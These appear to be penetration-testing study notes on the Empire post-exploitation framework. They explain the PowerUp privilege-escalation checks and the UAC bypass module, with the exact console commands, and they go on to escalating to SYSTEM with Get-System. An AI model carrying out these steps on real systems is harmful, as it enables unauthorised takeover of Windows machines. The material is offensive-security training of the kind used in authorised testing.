Empire - Empire PowerUp Module and UAC Bypass


+ This module will search for common privilege escalation vulnerabilities such as vulnerable services, latent passwords, UAC bypass and more

+ Starting point to help you for escalating privilege

+ Interact with agent and use the module
	# (Empire: TargetMe) > usemodule privesc/powerup/allchecks
	# (Empire: powershell/privesc/powerup/allchecks) > execute
	
	
Empire UAC Bypass

+ User Account Control enforces process integrity levels: High, Medium and low

+ If user is local administrator, UAC will ensure most of their applications will run with medium integrity

+ If you compromise a user who is a member of a local administrator group via a client side attack your payload will only exist in a medium integrity process

+ This means that you won't be able to elevate to administrator even though the victim user is a member of the Administrators group

+ We can overcome UAC restrictions by using Empire bypass UAC module

+ This module will allow us to skate over a medium integrity process by utilizing a trusted publisher certificate through process injection

+ The module then spawn a process powershell.exe with UAC turned off

+ When UAC is turned off, privileged commands can be run without fear that the UAC box will impede our efforts.

+ Interact with agent, use module, configure the module and execute the module
	# (Empire: TargetMe) > usemodule privesc/bypassuac
	# (Empire: powershell/privesc/bypassuac) > set Listener http
	# (Empire: powershell/privesc/bypassuac) > execute

+ You will get new agent from the same system, observe at Username, the new agent will have asterisk append to it username

+ This new agent is a session without UAC enabled and you can execute module like Get-System to escalate to the most privileged account on the system
